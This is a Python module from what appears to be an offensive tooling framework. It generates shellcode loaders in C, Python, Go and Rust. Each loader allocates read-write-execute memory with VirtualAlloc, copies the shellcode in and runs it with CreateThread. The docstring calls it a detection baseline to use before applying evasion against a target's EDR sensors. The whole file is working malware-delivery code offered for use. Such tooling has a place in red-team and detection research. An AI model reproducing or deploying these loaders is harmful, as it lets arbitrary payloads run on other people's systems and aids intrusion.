"""Loader: win_malloc_rwx — VirtualAlloc(RWX) → memcpy → CreateThread.

Tier 1 baseline. Maximum EDR/AV visibility:
  - RWX allocation is a high-confidence indicator for most products
  - CreateThread from a non-image-backed page is flagged by most EDR kernel callbacks

Use for:
  - Confirming shellcode functionality before applying evasion
  - Establishing detection baseline on a target sensor stack
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_malloc_rwx")

_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>

{sc_array}

int main(void) {{
    LPVOID mem = VirtualAlloc(NULL, sc_len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!mem) {{
        fprintf(stderr, "[-] VirtualAlloc failed: %lu\\n", GetLastError());
        return 1;
    }}
    memcpy(mem, sc, sc_len);

    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    if (!hThread) {{
        fprintf(stderr, "[-] CreateThread failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import sys

{sc_bytes}

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c_void_p
kernel32.CreateThread.restype = ctypes.c_void_p

mem = kernel32.VirtualAlloc(None, len(sc),
                            0x3000,   # MEM_COMMIT | MEM_RESERVE
                            0x40)     # PAGE_EXECUTE_READWRITE
if not mem:
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
kernel32.RtlMoveMemory(ctypes.c_void_p(mem), buf, len(sc))

ht = kernel32.CreateThread(None, 0, ctypes.c_void_p(mem), None, 0, None)
if not ht:
    sys.exit(1)
kernel32.WaitForSingleObject(ctypes.c_void_p(ht), 0xFFFFFFFF)
"""


_GO_TEMPLATE = """\
package main

import (
\t"syscall"
\t"unsafe"
)

{sc_bytes}

func main() {{
\tk32           := syscall.NewLazyDLL("kernel32.dll")
\tpVirtualAlloc := k32.NewProc("VirtualAlloc")
\tpVirtualFree  := k32.NewProc("VirtualFree")
\tpCreateThread := k32.NewProc("CreateThread")
\tpWaitSingle   := k32.NewProc("WaitForSingleObject")
\tpRtlMove      := k32.NewProc("RtlMoveMemory")

\taddr, _, _ := pVirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x40)
\tif addr == 0 {{
\t\treturn
\t}}
\tpRtlMove.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
\tht, _, _ := pCreateThread.Call(0, 0, addr, 0, 0, 0)
\tif ht == 0 {{
\t\tpVirtualFree.Call(addr, 0, 0x8000)
\t\treturn
\t}}
\tpWaitSingle.Call(ht, 0xFFFFFFFF)
\tpVirtualFree.Call(addr, 0, 0x8000)
}}
"""

_RS_TEMPLATE = """\
#![allow(non_snake_case)]
use std::ptr;

#[link(name = "kernel32")]
extern "system" {{
    fn VirtualAlloc(lpAddress: *mut u8, dwSize: usize, flAllocationType: u32,
                    flProtect: u32) -> *mut u8;
    fn VirtualFree(lpAddress: *mut u8, dwSize: usize, dwFreeType: u32) -> i32;
    fn CreateThread(lpThreadAttributes: *mut u8, dwStackSize: usize,
                    lpStartAddress: unsafe extern "system" fn(*mut u8) -> u32,
                    lpParameter: *mut u8, dwCreationFlags: u32,
                    lpThreadId: *mut u32) -> *mut u8;
    fn WaitForSingleObject(hHandle: *mut u8, dwMilliseconds: u32) -> u32;
    fn CloseHandle(hObject: *mut u8) -> i32;
}}

fn main() {{
    {sc_bytes}
    unsafe {{
        let p = VirtualAlloc(ptr::null_mut(), sc.len(), 0x3000, 0x40);
        if p.is_null() {{ return; }}
        ptr::copy_nonoverlapping(sc.as_ptr(), p, sc.len());
        let entry: unsafe extern "system" fn(*mut u8) -> u32 = std::mem::transmute(p);
        let ht = CreateThread(ptr::null_mut(), 0, entry, ptr::null_mut(), 0, ptr::null_mut());
        if ht.is_null() {{ VirtualFree(p, 0, 0x8000); return; }}
        WaitForSingleObject(ht, 0xFFFFFFFF);
        CloseHandle(ht);
        VirtualFree(p, 0, 0x8000);
    }}
}}
"""


def generate_c(shellcode: bytes) -> str:
    """Return a compilable C loader for shellcode using VirtualAlloc(RWX) + CreateThread."""
    return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))


def generate_python(shellcode: bytes) -> str:
    """Return a Python ctypes loader using VirtualAlloc(RWX) + CreateThread."""
    return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))


def generate_go(shellcode: bytes) -> str:
    """Return a Go loader using VirtualAlloc(RWX) + CreateThread."""
    return _GO_TEMPLATE.format(sc_bytes=_render.go_bytes_literal(shellcode, "sc"))


def generate_rust(shellcode: bytes) -> str:
    """Return a Rust loader using VirtualAlloc(RWX) + CreateThread."""
    return _RS_TEMPLATE.format(sc_bytes=_render.rust_bytes_literal(shellcode, "sc"))
